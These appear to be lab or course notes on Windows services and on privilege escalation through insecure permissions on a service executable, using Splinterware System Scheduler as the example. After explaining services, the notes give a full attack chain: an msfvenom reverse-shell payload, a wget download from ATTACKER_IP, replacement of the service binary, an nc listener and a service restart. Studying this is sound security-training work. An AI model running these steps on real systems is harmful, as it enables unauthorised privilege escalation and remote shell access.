1. WINDOWS SERVICES

Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking 
the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note
that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a 
service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, check the 'apphostsvc' service configuration with the sc qc command:

	sc qc apphostsvc

	Sample O/P: 
		[SC] QueryServiceConfig SUCCESS

		SERVICE_NAME: apphostsvc
        		TYPE               : 20  WIN32_SHARE_PROCESS
        		START_TYPE         : 2   AUTO_START
        		ERROR_CONTROL      : 1   NORMAL
        		BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        		LOAD_ORDER_GROUP   :
        		TAG                : 0
        		DISPLAY_NAME       : Application Host Helper Service
        		DEPENDENCIES       :
        		SERVICE_START_NAME : localSystem

Here, "BINARY_PATH_NAME" parameter - specifies associated executable
      "SERVICE_START_NAME" parameter - specifies account used to run the service

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration,
or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker.

All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:

A subkey exists for every service in the system. Again, we can see the associated executable on the 'ImagePath' value and the account used to start
the service on the 'ObjectName' value. If a DACL has been configured for the service, it will be stored in a subkey called 'Security'.Only 
administrators can modify such registry entries by default.


2. INSECURE PERMISSIONS ON SERVICE EXECUTABLES


If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

Let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:

	sc qc WindowsScheduler

	Sampple O/P:
		[SC] QueryServiceConfig SUCCESS

		SERVICE_NAME: windowsscheduler
        			TYPE               : 10  WIN32_OWN_PROCESS
        			START_TYPE         : 2   AUTO_START
        			ERROR_CONTROL      : 0   IGNORE
        			BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        			LOAD_ORDER_GROUP   :
        			TAG                : 0
       				DISPLAY_NAME       : System Scheduler Service
        			DEPENDENCIES       :
        			SERVICE_START_NAME : .\svcuser1

The service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in 
'C:\Progra~2\System~1\WService.exe'. We then proceed to check the permissions on the executable:

	icacls C:\PROGRA~2\SYSTEM~1\WService.exe

	Sample O/P:
		C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

		Successfully processed 1 files; Failed processing 0 files

The 'Everyone' group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our 
preference, and the service will execute it with the privileges of the configured user account.

Generate an 'exe-service; payload using msfvenom on attacker machine and serve it through a python webserver:

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

	python3 -m http.server

Pull the payload from Powershell with the following command:

	wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute 
our payload, we'll want to grant full permissions to the Everyone group as well:

	move WService.exe WService.exe.bkp

	move C:\Users\thm-unpriv\rev-svc.exe WService.exe

	icacls WService.exe /grant Everyone:F

Start a reverse listener on our attacker machine:

	nc -lvp 4445

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned 
privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:

	sc stop windowsscheduler

	sc start windowsscheduler

NOTE: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:







